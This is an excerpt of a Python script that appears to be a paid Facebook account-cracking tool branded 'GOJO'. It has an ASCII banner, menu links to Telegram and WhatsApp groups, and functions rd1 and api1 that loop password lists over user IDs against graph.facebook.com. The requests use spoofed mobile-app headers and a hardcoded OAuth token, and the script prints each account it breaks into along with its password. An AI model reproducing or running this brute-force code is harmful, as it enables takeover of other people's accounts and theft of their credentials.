...
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░
══════════GOJO IS ALWAYS BRAND══════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  GOJO SATURO 
\033[1;32m  • \033[1;37m GitHub     :-  GOJOMAX 
\033[1;32m  • \033[1;37m Type       :-  Paid
\033[1;32m  • \033[1;37m Version    :-  {version2.1}""")
os.system('clear')
...
def Main_VENOM():
        ...
        if opt1 == "1": method()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://t.me/GOJOMAXpro');Main_VENOM()
            if d == '2':os.system('xdg-open https://www.facebook.com/rupshiemon2.0');Main_VENOM()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://chat.whatsapp.com/HEhfeaajh1IITDiVpyJIz');Main_VENOM()
            if d == '2':os.system('xdg-open https://facebook.com/groups/124591283965935/');Main_VENOM()
            if d == '0':Main_VENOM()
            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
...
def rd1(ids,passlist):
    try:
        ...
        for pas in passlist:
                ...
                head = {'User-Agent':GOJO_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mGOJO-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\033[1;32m [GOJO-OK] '+uid+' √ '+pas)
